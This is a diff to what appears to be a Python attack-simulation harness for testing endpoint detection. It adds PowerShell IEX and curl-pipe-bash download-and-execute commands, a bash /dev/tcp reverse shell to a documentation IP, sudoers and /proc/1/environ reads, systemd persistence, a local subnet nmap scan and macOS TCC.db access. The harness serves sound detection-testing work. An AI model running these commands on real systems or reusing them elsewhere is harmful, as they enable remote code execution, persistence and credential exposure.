@@ -701,6 +701,20 @@ def attack_lsass_access():
         log.warning("%s  access denied — GetLastError=%d (expected on hardened systems)",
                     _tag("TEST-ATTACK"), err)
 
+
+def attack_powershell_iex():
+    """IEX (Invoke-Expression) — most-signatured PowerShell download+exec technique."""
+    url = "https://httpbin.org/get"
+    log.warning("%s PowerShell IEX download+exec — %s", _tag("TEST-ATTACK"), url)
+    rc, out = run_cmd(
+        [
+            "powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
+            f"IEX (New-Object Net.WebClient).DownloadString('{url}')",
+        ],
+        timeout=20,
+    )
+    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])
+
 # ---------------------------------------------------------------------------
 # Attack simulations — Linux (all flavors)
 # ---------------------------------------------------------------------------
@@ -798,6 +812,127 @@ def attack_sensitive_dir_traversal():
     log.warning("%s  rc=%d  %d entries", _tag("TEST-ATTACK"), rc,
                 len(out.splitlines()) if out else 0)
 
+
+def attack_curl_pipe_bash():
+    """Download from httpbin and pipe directly to bash — curl|bash pattern detection."""
+    url = "https://httpbin.org/get"
+    log.warning("%s curl-pipe-bash — download and pipe to bash → %s", _tag("TEST-ATTACK"), url)
+    rc, out = run_cmd(
+        ["bash", "-c", f"curl -s {url} | bash"],
+        timeout=15,
+    )
+    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])
+
+
+def attack_reverse_shell_sim():
+    """Simulate bash reverse shell TCP redirect to RFC 5737 IP — fails safely, generates telemetry."""
+    host = "192.0.2.100"
+    port = 4444
+    log.warning(
+        "%s Reverse shell simulation → %s:%d (RFC 5737 — connection will fail, attempt generates telemetry)",
+        _tag("TEST-ATTACK"), host, port,
+    )
+    rc, out = run_cmd(
+        ["bash", "-c", f"bash -i >& /dev/tcp/{host}/{port} 0>&1"],
+        timeout=5,
+    )
+    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])
+
+
+def attack_sudo_recon():
+    """Enumerate sudo permissions — privilege escalation recon."""
+    cmds = [
+        ["sudo", "-l"],
+        ["sudo", "-n", "-l"],
+        ["cat", "/etc/sudoers"],
+        ["ls", "/etc/sudoers.d"],
+    ]
+    sample = random.sample(cmds, random.randint(2, 3))
+    log.warning("%s Sudo recon — %d commands", _tag("TEST-ATTACK"), len(sample))
+    for cmd in sample:
+        log.warning("%s  exec: %s", _tag("TEST-ATTACK"), " ".join(cmd))
+        rc, out = run_cmd(cmd, timeout=8)
+        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")
+
+
+def attack_systemd_persistence():
+    """Write a systemd user service file, enable it, then clean up — persistence simulation."""
+    service_dir = os.path.expanduser("~/.config/systemd/user")
+    service_path = os.path.join(service_dir, "sentinelone-test.service")
+    service_content = (
+        "[Unit]\n"
+        "Description=[TEST-ATTACK] SentinelOne persistence simulation\n"
+        "[Service]\n"
+        "ExecStart=/bin/echo [TEST-ATTACK] systemd service executed\n"
+        "[Install]\n"
+        "WantedBy=default.target\n"
+    )
+    log.warning("%s systemd user persistence — write/enable/disable/remove service", _tag("TEST-ATTACK"))
+    try:
+        os.makedirs(service_dir, exist_ok=True)
+        with open(service_path, "w") as f:
+            f.write(service_content)
+        log.warning("%s  service file written: %s", _tag("TEST-ATTACK"), service_path)
+
+        rc, out = run_cmd(["systemctl", "--user", "daemon-reload"], timeout=10)
+        log.warning("%s  daemon-reload rc=%d", _tag("TEST-ATTACK"), rc)
+
+        rc, out = run_cmd(["systemctl", "--user", "enable", "sentinelone-test"], timeout=10)
+        log.warning("%s  enable rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80])
+
+        rc, out = run_cmd(["systemctl", "--user", "disable", "sentinelone-test"], timeout=10)
+        log.warning("%s  disable rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80])
+
+        try:
+            os.remove(service_path)
+            log.warning("%s  service file removed", _tag("TEST-ATTACK"))
+        except OSError as exc:
+            log.warning("%s  remove error: %s", _tag("TEST-ATTACK"), exc)
+
+        rc, out = run_cmd(["systemctl", "--user", "daemon-reload"], timeout=10)
+        log.warning("%s  final daemon-reload rc=%d", _tag("TEST-ATTACK"), rc)
+
+    except PermissionError as exc:
+        log.warning("%s  PermissionError (expected on hardened systems): %s", _tag("TEST-ATTACK"), exc)
+    except Exception as exc:
+        log.warning("%s  error: %s", _tag("TEST-ATTACK"), exc)
+
+
+def attack_nmap_scan():
+    """Run nmap top-ports scan against the local /24 subnet."""
+    if not _which("nmap"):
+        log.warning("%s nmap not found — skipping nmap scan", _tag("TEST-ATTACK"))
+        return
+    subnet = get_local_subnet()
+    target = f"{subnet}.0/24"
+    log.warning("%s nmap scan — %s top 20 ports -T4", _tag("TEST-ATTACK"), target)
+    rc, out = run_cmd(["nmap", "--top-ports", "20", "-T4", target], timeout=45)
+    log.warning("%s  rc=%d  %d result lines", _tag("TEST-ATTACK"), rc,
+                len(out.splitlines()) if out else 0)
+
+
+def attack_proc_access():
+    """Attempt to read sensitive /proc/1 files — process memory recon simulation."""
+    paths = [
+        "/proc/1/maps",
+        "/proc/1/cmdline",
+        "/proc/1/environ",
+        "/proc/1/status",
+    ]
+    log.warning("%s /proc/1 access — process memory recon", _tag("TEST-ATTACK"))
+    for path in paths:
+        log.warning("%s  open: %s", _tag("TEST-ATTACK"), path)
+        try:
+            with open(path, "rb") as f:
+                data = f.read(512)
+            log.warning("%s    → READ %d bytes", _tag("TEST-ATTACK"), len(data))
+        except PermissionError:
+            log.warning("%s    → DENIED (expected)", _tag("TEST-ATTACK"))
+        except FileNotFoundError:
+            log.warning("%s    → not found", _tag("TEST-ATTACK"))
+        except Exception as exc:
+            log.warning("%s    → %s", _tag("TEST-ATTACK"), exc)
+
 # ---------------------------------------------------------------------------
 # Attack simulations — RHEL/CentOS specific
 # ---------------------------------------------------------------------------
@@ -889,6 +1024,52 @@ def attack_macos_recon():
     rc, out = run_cmd(cmd, timeout=10)
     log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")
 
+
+def attack_tcc_access():
+    """Attempt to open TCC.db — macOS app permission database access simulation."""
+    paths = [
+        os.path.expanduser("~/Library/Application Support/com.apple.TCC/TCC.db"),
+        "/Library/Application Support/com.apple.TCC/TCC.db",
+    ]
+    log.warning("%s TCC.db access — macOS app permission database", _tag("TEST-ATTACK"))
+    for path in paths:
+        log.warning("%s  open: %s", _tag("TEST-ATTACK"), path)
+        try:
+            with open(path, "rb") as f:
+                data = f.read(512)
+            log.warning("%s    → READ %d bytes", _tag("TEST-ATTACK"), len(data))
+        except PermissionError:
+            log.warning("%s    → DENIED (expected)", _tag("TEST-ATTACK"))
+        except FileNotFoundError:
+            log.warning("%s    → not found", _tag("TEST-ATTACK"))
+        except Exception as exc:
+            log.warning("%s    → %s", _tag("TEST-ATTACK"), exc)
+
+
+def attack_gatekeeper_recon():
+    """Query Gatekeeper and code-signing status — macOS security policy recon."""
+    cmds = [
+        ["spctl", "--status"],
+        ["spctl", "--assess", "--type", "exec", "/bin/bash"],
+        ["codesign", "--verify", "--verbose", "/bin/bash"],
+        ["csrutil", "status"],
+    ]
+    log.warning("%s Gatekeeper/SIP recon — macOS security policy enumeration", _tag("TEST-ATTACK"))
+    for cmd in cmds:
+        log.warning("%s  exec: %s", _tag("TEST-ATTACK"), " ".join(cmd))
+        rc, out = run_cmd(cmd, timeout=10)
+        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")
+
+
+def attack_osascript():
+    """Execute a shell command via osascript — macOS scripting bridge abuse."""
+    log.warning("%s osascript shell execution — scripting bridge", _tag("TEST-ATTACK"))
+    rc, out = run_cmd(
+        ["osascript", "-e", 'do shell script "echo [TEST-ATTACK] osascript execution"'],
+        timeout=10,
+    )
+    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])
+
 # ---------------------------------------------------------------------------
 # Build OS-appropriate attack list
 # ---------------------------------------------------------------------------
@@ -921,6 +1102,7 @@ _ATTACKS_BY_OS = {
         attack_scheduled_task,
         attack_vss_recon,
         attack_lsass_access,
+        attack_powershell_iex,
     ],
     "rhel": [
         attack_bash_chain,
@@ -933,6 +1115,12 @@ _ATTACKS_BY_OS = {
         attack_sensitive_dir_traversal,
         attack_rpm_verify,
         attack_yum_recon,
+        attack_curl_pipe_bash,
+        attack_reverse_shell_sim,
+        attack_sudo_recon,
+        attack_systemd_persistence,
+        attack_nmap_scan,
+        attack_proc_access,
     ],
     "debian": [
         attack_bash_chain,
@@ -945,6 +1133,12 @@ _ATTACKS_BY_OS = {
         attack_sensitive_dir_traversal,
         attack_dpkg_recon,
         attack_kali_tool_probe,
+        attack_curl_pipe_bash,
+        attack_reverse_shell_sim,
+        attack_sudo_recon,
+        attack_systemd_persistence,
+        attack_nmap_scan,
+        attack_proc_access,
     ],
     "macos": [
         attack_bash_chain,
@@ -956,6 +1150,13 @@ _ATTACKS_BY_OS = {
         attack_keychain_access,
         attack_launchd_persistence,
         attack_macos_recon,
+        attack_curl_pipe_bash,
+        attack_reverse_shell_sim,
+        attack_sudo_recon,
+        attack_nmap_scan,
+        attack_tcc_access,
+        attack_gatekeeper_recon,
+        attack_osascript,
     ],
     "linux": [
         attack_bash_chain,
@@ -966,6 +1167,12 @@ _ATTACKS_BY_OS = {
         attack_cron_persistence_attempt,
         attack_ptrace_attempt,
         attack_sensitive_dir_traversal,
+        attack_curl_pipe_bash,
+        attack_reverse_shell_sim,
+        attack_sudo_recon,
+        attack_systemd_persistence,
+        attack_nmap_scan,
+        attack_proc_access,
     ],
 }
 
